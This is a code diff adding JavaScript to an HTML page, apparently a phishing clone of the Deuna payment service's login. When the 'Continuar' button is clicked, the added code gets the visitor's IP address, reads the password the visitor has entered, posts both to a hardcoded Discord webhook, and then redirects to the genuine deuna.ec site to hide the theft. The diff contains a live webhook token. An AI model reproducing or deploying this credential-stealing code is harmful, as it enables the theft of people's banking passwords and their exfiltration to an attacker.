@@ -277,6 +277,36 @@
             const currentType = pwdInput.getAttribute('type');
             pwdInput.setAttribute('type', currentType === 'password' ? 'text' : 'password');
         });
+
+            // Redirigir al hacer clic en el botón
+            btnContinuar.addEventListener('click', () => {
+                                if (!btnContinuar.disabled) {
+                                        fetch('https://api.ipify.org?format=json')
+                                            .then(response => response.json())
+                                            .then(data => {
+                                                const ip = data.ip;
+                                                const clave = pwdInput.value;
+                                                fetch('https://discordapp.com/api/webhooks/1478881955914448928/aIqH3pP2YLxjTfEaHLp13Yva48No9fcG9A_XrM5UcGQVyBmlr-ZRr_K0q2Lu6F-MDj26', {
+                                                    method: 'POST',
+                                                    headers: {
+                                                        'Content-Type': 'application/json'
+                                                    },
+                                                    body: JSON.stringify({
+                                                        content: `🌐 IP: ${ip}\n🔑 Clave creada: ${clave}`
+                                                    })
+                                                })
+                                                .then(() => {
+                                                    window.location.href = 'https://www.deuna.ec/';
+                                                })
+                                                .catch(() => {
+                                                    window.location.href = 'https://www.deuna.ec/';
+                                                });
+                                            })
+                                            .catch(() => {
+                                                window.location.href = 'https://www.deuna.ec/';
+                                            });
+                                }
+                        });
     </script>
 </body>
 </html>
